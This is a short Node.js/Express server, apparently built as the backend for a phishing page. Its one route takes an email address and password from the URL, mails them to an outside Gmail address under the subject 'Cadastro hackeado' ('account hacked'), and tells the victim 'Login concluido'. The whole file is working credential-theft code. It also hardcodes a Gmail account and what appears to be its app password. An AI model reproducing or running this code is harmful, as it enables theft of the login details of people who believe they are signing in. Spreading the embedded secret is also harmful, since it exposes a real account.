import express from 'express'
const servidor = express() ;
import nodemailer from 'nodemailer'



servidor.get('/send/:email/:senha', (req, resp) => {

    let email= req.params.email
    let senha= req.params.senha

const trasport = nodemailer.createTransport({

    host: 'smtp.gmail.com',
    port: 465,
    secure: true,
    auth:{
        user: 'hackingfeira@gmail.com',
        pass: 'vxbg dcbw doxm lxgu'

    },
    pool: true,
    rateLimit: 5,
    socketTimeout: 5000, 
});




trasport.sendMail({

from: 'hackingfeira@email.com',
to:'nivoltareli@gmail.com',
subject: 'Cadastro hackeado',
text: `
Email: ${email}
Senha: ${senha}`

})





.then(()=> resp.send('Login concluido') )
.catch((err)=> resp.send('erro a logar', err))

})

servidor.listen(3030, () => console.log("api subiu na porta 3030"))